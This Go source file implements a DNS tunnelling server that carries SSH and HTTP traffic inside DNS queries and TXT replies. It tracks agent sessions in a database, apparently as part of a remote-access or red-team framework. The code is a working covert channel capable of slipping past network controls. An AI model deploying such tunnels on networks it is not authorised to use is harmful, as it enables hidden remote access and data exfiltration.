package transport

/*
DNS Tunnel Client
Copyright (c) 2024 Barrett Lyon
MIT License

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
import (
	"Goauld/common/log"
	"Goauld/common/net/blind"
	"Goauld/server/persistence"
	"fmt"
	"io"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/miekg/dns"
)

type BlindSession struct {
	conn       net.Conn
	lastActive time.Time
	mu         sync.Mutex
	closed     bool
}

func (s *BlindSession) reconnect(tcpDest string) error {
	s.mu.Lock()
	defer s.mu.Unlock()

	// Close existing connection if any
	if s.conn != nil {
		s.conn.Close()
	}

	// Force IPv4
	dialer := &net.Dialer{
		Timeout:   30 * time.Second,
		DualStack: false, // Disable IPv6
	}

	// Resolve address to IPv4 only
	host, port, err := net.SplitHostPort(tcpDest)
	if err != nil {
		return fmt.Errorf("invalid address %s: %v", tcpDest, err)
	}

	ips, err := net.LookupIP(host)
	if err != nil {
		return fmt.Errorf("failed to resolve %s: %v", host, err)
	}

	// Find first IPv4 address
	var ipv4 net.IP
	for _, ip := range ips {
		if ip.To4() != nil {
			ipv4 = ip
			break
		}
	}

	if ipv4 == nil {
		return fmt.Errorf("no IPv4 address found for %s", host)
	}

	// Connect using IPv4 address
	addr := net.JoinHostPort(ipv4.String(), port)
	conn, err := dialer.Dial("tcp4", addr) // Force TCP4
	if err != nil {
		return fmt.Errorf("reconnection failed: %v", err)
	}

	// Set keepalive
	if tcpConn, ok := conn.(*net.TCPConn); ok {
		tcpConn.SetKeepAlive(true)
		tcpConn.SetKeepAlivePeriod(30 * time.Second)
	}

	s.conn = conn
	s.lastActive = time.Now()
	return nil
}

func (s *BlindSession) Write(data []byte) error {
	s.mu.Lock()
	defer s.mu.Unlock()

	if s.conn == nil {
		return fmt.Errorf("connection is nil")
	}

	// Set write deadline
	s.conn.SetWriteDeadline(time.Now().Add(250 * time.Millisecond))
	defer s.conn.SetWriteDeadline(time.Time{})

	_, err := s.conn.Write(data)
	if err != nil {
		s.conn.Close()
		s.conn = nil
		return fmt.Errorf("write error: %v", err)
	}

	s.lastActive = time.Now()
	return nil
}

func (s *BlindSession) Read(buffer []byte) (int, error) {
	s.mu.Lock()
	defer s.mu.Unlock()

	if s.conn == nil {
		return 0, fmt.Errorf("connection is nil")
	}

	// Set a short read deadline
	//s.conn.SetReadDeadline(time.Now().Add(250 * time.Millisecond))
	//defer s.conn.SetReadDeadline(time.Time{})

	n, err := s.conn.Read(buffer)
	if err != nil {
		if err == io.EOF {
			// Handle EOF by closing the connection
			s.conn.Close()
			s.conn = nil
			return 0, err
		}
		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
			// Timeout is normal for polling, return 0 bytes
			return 0, nil
		}
		// Other errors should close the connection
		s.conn.Close()
		s.conn = nil
		return 0, fmt.Errorf("read error: %v", err)
	}

	s.lastActive = time.Now()
	return n, nil
}

func (s *BlindSession) Close() {
	s.mu.Lock()
	defer s.mu.Unlock()

	if !s.closed {
		s.closed = true
		if s.conn != nil {
			s.conn.Close()
			s.conn = nil
		}
	}
}

func (s *BlindSession) IsClosed() bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.closed
}

type DNSServer struct {
	//dnsListener            string
	SSHDest                string
	HTTPDest               string
	domain                 string
	sessions               map[string]*BlindSession
	mu                     sync.Mutex
	debug                  bool
	sessionCleanupInterval time.Duration
	db                     *persistence.DB
}

func NewDNSServer(db *persistence.DB, SSHDest string, HTTPDest string, domain string, debug bool) *DNSServer {
	return &DNSServer{
		//dnsListener: dnsListener,
		HTTPDest: HTTPDest,
		SSHDest:  SSHDest,
		domain:   domain,
		sessions: make(map[string]*BlindSession),
		mu:       sync.Mutex{},
		debug:    debug,
		db:       db,
	}
}

/*
	func (s *DNSServer) Start() error {
		// Start session cleanup goroutine
		go s.cleanupBlindSessions()

		dns.HandleFunc(".", s.handleDNSRequest)
		server := &dns.Server{Addr: s.dnsListener, Net: "udp"}

		if s.debug {
			log.Printf("DNS server starting on %s (UDP)", s.dnsListener)
		}

		return server.ListenAndServe()
	}
*/
func (s *DNSServer) getBlindSession(sessionID string) (*BlindSession, error) {
	s.mu.Lock()
	defer s.mu.Unlock()

	dest := s.SSHDest
	if strings.HasPrefix(sessionID, "C") {
		dest = s.HTTPDest
	}
	session, exists := s.sessions[sessionID]
	if !exists || session.conn == nil {
		// Create new session with connection
		session = &BlindSession{
			lastActive: time.Now(),
		}

		// Connect using IPv4
		if err := session.reconnect(dest); err != nil {
			return nil, err
		}

		s.sessions[sessionID] = session

		if s.debug {
			log.Printf("Created new connection for session %s to %s", sessionID, dest)
		}
	}

	return session, nil
}

func (s *DNSServer) handlePoll(session *BlindSession) ([]byte, error) {
	if session == nil || session.IsClosed() {
		return []byte("CLOSED"), nil
	}

	buffer := make([]byte, blind.MaxChunkSize)

	session.conn.SetReadDeadline(time.Now().Add(250 * time.Millisecond))
	defer session.conn.SetReadDeadline(time.Time{})

	n, err := session.conn.Read(buffer)
	if err != nil {
		log.Trace().Msgf("Read error: %v", err)
		log.Trace().Msgf("Read error: %v", err)
		if err == io.EOF || strings.Contains(err.Error(), "connection reset") {
			session.Close()
			return []byte("CLOSED"), nil
		}
		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
			return []byte("EMPTY"), nil
		}
		return nil, err
	}

	if n == 0 {
		return []byte("EMPTY"), nil
	}

	return buffer[:n], nil
}

func (s *DNSServer) handleDNSRequest(dnsConn net.PacketConn, r *dns.Msg, addr net.Addr) {
	if len(r.Question) == 0 {
		return
	}

	question := r.Question[0]
	if s.debug {
		//log.Printf("=== Received DNS Request ===")
		//log.Printf("From: %s", addr.String())
		//log.Printf("Raw message: %v", r.String())
		//log.Printf("Question: %s (type: %d)", question.Name, question.Qtype)
	}

	// Create response message
	msg := new(dns.Msg)
	msg.SetReply(r)

	// Set EDNS0 options for larger responses
	if opt := r.IsEdns0(); opt != nil {
		msg.SetEdns0(opt.UDPSize(), opt.Do())
	} else {
		msg.SetEdns0(4096, false)
	}

	// Parse the DNS question
	parts := strings.Split(strings.TrimSuffix(strings.TrimSuffix(strings.TrimSuffix(question.Name, "."), s.domain), "."), ".")
	// Validate parts length
	if len(parts) < 3 {
		if s.debug {
			log.Printf("Invalid request format: not enough parts")
		}
		msg.Rcode = dns.RcodeFormatError
		err := WriteMsg(msg, dnsConn, addr)
		if err != nil {
			log.Trace().Err(err).Str("Mode", "DNSSH-ALT").Msg("Failed to send DNS message")
		}
		return
	}

	// Extract parts in reverse order since DNS names are right-to-left
	sessionID := parts[len(parts)-1]
	sequence := parts[len(parts)-2]

	// Combine all remaining parts as the encoded data
	encodedData := strings.Join(parts[:len(parts)-2], ".")

	if s.debug {
		log.Printf("Parsed request:")
		log.Printf("  Encoded data: %s", encodedData)
		log.Printf("  Sequence: %s", sequence)
		log.Printf("  BlindSession ID: %s", sessionID)
		log.Printf("  TLD: %s", s.domain)
	}

	// Get or create session
	session, err := s.getBlindSession(sessionID)
	if err != nil {
		if s.debug {
			log.Printf("Failed to get/create session: %v", err)
		}
		msg.Rcode = dns.RcodeServerFailure
		err = WriteMsg(msg, dnsConn, addr)
		if err != nil {
			log.Trace().Err(err).Str("Mode", "DNSSH-ALT").Msg("Failed to send DNS message")
		}
		return
	}

	if sequence == "aaaa" && strings.HasPrefix(sessionID, "S") {
		err = s.db.SetAgentSSHMode(encodedData, "DNS-ALT", strings.Split(addr.String(), ":")[0])
		if err != nil {
			log.Trace().Err(err).Str("Mode", "DNSSH-ALT").Msg("Failed to send DNS message")
		}
		return
	}
	// Handle the request
	isPoll := sequence == "ffff"
	var responseText string

	if isPoll {
		response, err := s.handlePoll(session)
		if err != nil {
			if s.debug {
				log.Printf("Poll error: %v", err)
			}
			msg.Rcode = dns.RcodeServerFailure
			err = WriteMsg(msg, dnsConn, addr)
			if err != nil {
				log.Trace().Err(err).Str("Mode", "DNSSH-ALT").Msg("Failed to send DNS message")
			}
			return
		}

		if response == nil || len(response) == 0 {
			msg.Answer = append(msg.Answer, &dns.TXT{
				Hdr: dns.RR_Header{
					Name:   question.Name,
					Rrtype: dns.TypeTXT,
					Class:  dns.ClassINET,
					Ttl:    0,
				},
				Txt: []string{"EMPTY"},
			})
		} else {
			// Encode the response data properly
			encoded := blind.EncodeDNSSafe(response)
			chunks := strings.Split(encoded, ".")

			txt := &dns.TXT{
				Hdr: dns.RR_Header{
					Name:   question.Name,
					Rrtype: dns.TypeTXT,
					Class:  dns.ClassINET,
					Ttl:    0,
				},
				Txt: chunks,
			}
			msg.Answer = append(msg.Answer, txt)

			if s.debug {
				//log.Printf("Sending response with %d chunks", len(chunks))
			}
		}
		err = WriteMsg(msg, dnsConn, addr)
		if err != nil {
			log.Trace().Err(err).Str("Mode", "DNSSH-ALT").Msg("Failed to send DNS message")
		}
		return
	} else {
		// Handle regular data
		decodedData, err := blind.DecodeDNSSafe(encodedData)
		if err != nil {
			if s.debug {
				log.Printf("Failed to decode data: %v", err)
			}
			msg.Rcode = dns.RcodeFormatError
			err = WriteMsg(msg, dnsConn, addr)
			if err != nil {
				log.Trace().Err(err).Str("Mode", "DNSSH-ALT").Msg("Failed to send DNS message")
			}
			return
		}

		if len(decodedData) > 0 {
			if s.debug {
				//log.Printf("Writing %d bytes to connection", len(decodedData))
			}

			if err := session.Write(decodedData); err != nil {
				if s.debug {
					//log.Printf("Failed to write to connection: %v", err)
				}
				msg.Rcode = dns.RcodeServerFailure
				err = WriteMsg(msg, dnsConn, addr)
				if err != nil {
					log.Trace().Err(err).Str("Mode", "DNSSH-ALT").Msg("Failed to send DNS message")
				}
				return
			}
		}
		responseText = "EMPTY"
	}

	// Split response into smaller chunks if needed
	const maxResponseChunkSize = 180 // Smaller response chunks

	if len(responseText) > maxResponseChunkSize {
		chunks := make([]string, 0)
		for i := 0; i < len(responseText); i += maxResponseChunkSize {
			end := i + maxResponseChunkSize
			if end > len(responseText) {
				end = len(responseText)
			}
			chunks = append(chunks, responseText[i:end])
		}
		txt := &dns.TXT{
			Hdr: dns.RR_Header{
				Name:   question.Name,
				Rrtype: dns.TypeTXT,
				Class:  dns.ClassINET,
				Ttl:    0,
			},
			Txt: chunks,
		}
		msg.Answer = append(msg.Answer, txt)
	} else {
		txt := &dns.TXT{
			Hdr: dns.RR_Header{
				Name:   question.Name,
				Rrtype: dns.TypeTXT,
				Class:  dns.ClassINET,
				Ttl:    0,
			},
			Txt: []string{responseText},
		}
		msg.Answer = append(msg.Answer, txt)
	}

	if s.debug {
		//log.Printf("Sending response with %d chunks", len(msg.Answer[0].(*dns.TXT).Txt))
	}

	err = WriteMsg(msg, dnsConn, addr)
	if err != nil {
		log.Trace().Err(err).Str("Mode", "DNSSH-ALT").Msg("Failed to send DNS message")
	}
}

func (s *DNSServer) createBlindSession(sessionID string) (*BlindSession, error) {
	// Force IPv4
	dialer := &net.Dialer{
		Timeout:   30 * time.Second,
		DualStack: false, // Disable IPv6
	}

	dest := s.SSHDest

	if strings.HasPrefix(sessionID, "C") {
		dest = s.HTTPDest
	}
	// Resolve address to IPv4 only
	host, port, err := net.SplitHostPort(dest)
	if err != nil {
		return nil, fmt.Errorf("invalid address %s: %v", dest, err)
	}

	ips, err := net.LookupIP(host)
	if err != nil {
		return nil, fmt.Errorf("failed to resolve %s: %v", host, err)
	}

	// Find first IPv4 address
	var ipv4 net.IP
	for _, ip := range ips {
		if ip.To4() != nil {
			ipv4 = ip
			break
		}
	}

	if ipv4 == nil {
		return nil, fmt.Errorf("no IPv4 address found for %s", host)
	}

	// Connect using IPv4 address
	addr := net.JoinHostPort(ipv4.String(), port)
	conn, err := dialer.Dial("tcp4", addr)
	if err != nil {
		return nil, fmt.Errorf("connection failed: %v", err)
	}

	// Set keepalive
	if tcpConn, ok := conn.(*net.TCPConn); ok {
		tcpConn.SetKeepAlive(true)
		tcpConn.SetKeepAlivePeriod(30 * time.Second)
	}

	session := &BlindSession{
		conn:       conn,
		lastActive: time.Now(),
	}

	return session, nil
}

func (s *DNSServer) cleanupBlindSessions() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		s.mu.Lock()
		now := time.Now()
		for id, session := range s.sessions {
			if session.IsClosed() || now.Sub(session.lastActive) > 5*time.Minute {
				if s.debug {
					log.Printf("Cleaning up session: %s (closed: %v, inactive: %v)",
						id,
						session.IsClosed(),
						now.Sub(session.lastActive) > 5*time.Minute)
				}
				session.Close()
				delete(s.sessions, id)
			}
		}
		s.mu.Unlock()
	}
}

func WriteMsg(msg *dns.Msg, conn net.PacketConn, addr net.Addr) error {
	pack, err := msg.Pack()
	if err != nil {
		return err
	}
	_, err = conn.WriteTo(pack, addr)
	return err
}
